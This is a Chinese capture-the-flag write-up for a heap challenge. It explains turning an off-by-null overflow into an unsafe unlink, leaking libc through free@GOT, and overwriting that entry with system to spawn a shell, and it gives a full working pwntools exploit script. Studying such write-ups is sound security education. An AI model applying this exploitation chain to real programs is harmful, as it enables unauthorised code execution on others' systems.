# 幻想乡缘起

## 题目简述

题目是菜单式堆管理程序，编辑功能存在 off-by-null：对较小 chunk 写满时可以把相邻 chunk 的 `size` 低字节清零，从而清除 `PREV_INUSE` 位。程序关闭 PIE，全局页指针表和 GOT 地址固定，且 GOT 可写。

利用思路是在前一个 chunk 的用户区伪造空闲 chunk，填满相邻大小的 tcache 后释放受害 chunk，迫使 glibc 执行向后合并和 unlink。通过伪造 `fd`、`bk` 改写全局指针表，再把表项指向 `free@GOT`，泄露 libc 后将其覆盖为 `system`，最后释放保存 `/bin/sh` 的 chunk 获得 shell。

## 解题过程

### 构造可触发 unlink 的堆布局

先申请一个 `0x28` 的溢出源 chunk、一个 `0xf0` 的受害 chunk，以及七个同尺寸 chunk。七个同尺寸 chunk 释放后会填满 `0x100` tcache bin，使后续释放受害 chunk 时进入需要合并的正常空闲流程。另申请一个保存 `/bin/sh\x00` 的 chunk，供最后触发 `system()`：

```python
add(0, 0x28)
add(1, 0xf0)

for index in range(2, 9):
    add(index, 0xf0)

add(14, 0x90, b"/bin/sh\x00")

for index in range(2, 9):
    free(index)
```

全局页指针表位于 `0x4040c0`。在 chunk 0 的用户区伪造大小为 `0x20` 的空闲 chunk，并令：

```python
fd = 0x4040c0 - 0x18
bk = 0x4040c0 - 0x10

fake_chunk = (
    p64(0)
    + p64(0x21)
    + p64(fd)
    + p64(bk)
    + p64(0x20)
)
edit(0, fake_chunk)
```

最后一个 `p64(0x20)` 落在 chunk 1 的 `prev_size`。off-by-null 同时把 chunk 1 原本以 `0x01` 结尾的 size 低字节清零，令 `PREV_INUSE=0`。释放 chunk 1 时，分配器按 `prev_size=0x20` 向后定位到伪 chunk。

`fd` 和 `bk` 围绕全局指针表构造，使 `FD->bk == P`、`BK->fd == P` 的 unlink 完整性检查成立。unlink 的两次链表写操作会把指针表项改成表本身附近的地址，从而让后续 `edit(0, ...)` 变成对页指针表的可控写。

### 把任意读写转成 GOT 劫持

unlink 后重新布置表项，使一个可查看、可编辑的条目指向 `free@GOT`：

```python
free(1)
edit(0, p64(0) * 3 + p64(0x404800) + p64(0x404018))
```

通过 `show(1)` 泄露 `free` 的实际地址，减去题目提供 libc 中的符号偏移得到 libc 基址；随后计算 `system` 并覆盖 `free@GOT`：

```python
show(1)
free_address = u64(io.recv(6).ljust(8, b"\x00"))
libc_base = free_address - libc.sym["free"]
system_address = libc_base + libc.sym["system"]

edit(1, p64(system_address)[:-1])
free(14)
io.interactive()
```

此时菜单中的 `free(page[14])` 实际执行 `system("/bin/sh")`，进入交互 shell 后读取比赛环境中的 flag。

### 完整 EXP

```python
from pwn import *

context.binary = elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

io = process(elf.path)
# io = remote("target", 10000)


def choose(option):
    io.sendlineafter(b"> :", str(option).encode())


def add(index, size, data=b"\x00"):
    choose(1)
    io.sendlineafter(b"Which page?", str(index).encode())
    io.sendlineafter(b"How long do you want to write?", str(size).encode())
    io.send(data)


def free(index):
    choose(2)
    io.sendlineafter(b"Which page has error?", str(index).encode())


def show(index):
    choose(3)
    io.sendlineafter(
        b"Which page do you want to review?\n",
        str(index).encode(),
    )


def edit(index, data):
    choose(4)
    io.sendlineafter(b"Which page needs be rewrite?", str(index).encode())
    io.sendafter(b"Please input correct history!", data)


add(0, 0x28)
add(1, 0xf0)

for index in range(2, 9):
    add(index, 0xf0)

add(14, 0x90, b"/bin/sh\x00")

for index in range(2, 9):
    free(index)

pointer_table = 0x4040c0
fd = pointer_table - 0x18
bk = pointer_table - 0x10
fake_chunk = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20)
edit(0, fake_chunk)

free(1)

free_got = 0x404018
edit(0, p64(0) * 3 + p64(0x404800) + p64(free_got))

show(1)
free_address = u64(io.recv(6).ljust(8, b"\x00"))
libc_base = free_address - libc.sym["free"]
system_address = libc_base + libc.sym["system"]
log.success(f"libc base: {libc_base:#x}")

edit(1, p64(system_address)[:-1])
free(14)
io.interactive()
```

## 方法总结

本题把一个字节的堆溢出扩展为 unsafe unlink 写原语，再借无 PIE 的固定全局表获得任意地址读写。利用成立还依赖两个环境条件：对应 tcache bin 必须先填满，才能让受害 chunk 参与合并；GOT 必须可写，才能把 `free` 劫持为 `system`。分析堆题时应逐字节标出 `prev_size`、`size` 和伪 chunk 的落点，而不是只记忆一组地址。
